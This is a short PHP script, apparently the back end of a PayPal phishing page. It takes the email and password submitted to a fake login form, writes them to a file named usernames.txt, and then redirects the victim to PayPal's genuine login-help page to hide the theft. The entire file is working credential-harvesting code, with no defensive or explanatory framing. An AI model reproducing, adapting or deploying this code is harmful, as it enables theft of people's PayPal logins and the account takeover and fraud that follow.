<?php

file_put_contents("usernames.txt", "Paypal Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.Paypal.com/us/LoginHelp');
exit();
?>